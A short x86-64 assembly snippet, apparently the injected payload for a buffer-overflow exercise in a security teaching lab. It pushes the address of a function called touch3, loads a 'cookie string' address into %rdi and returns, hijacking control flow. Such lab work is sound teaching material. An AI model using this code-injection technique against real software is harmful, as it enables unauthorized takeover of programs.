pushq $0x4018fa         # Address of function touch3
movq $0x5561dca8, %rdi  # Adress of cookie string
retq                    # Transfer control to function touch3
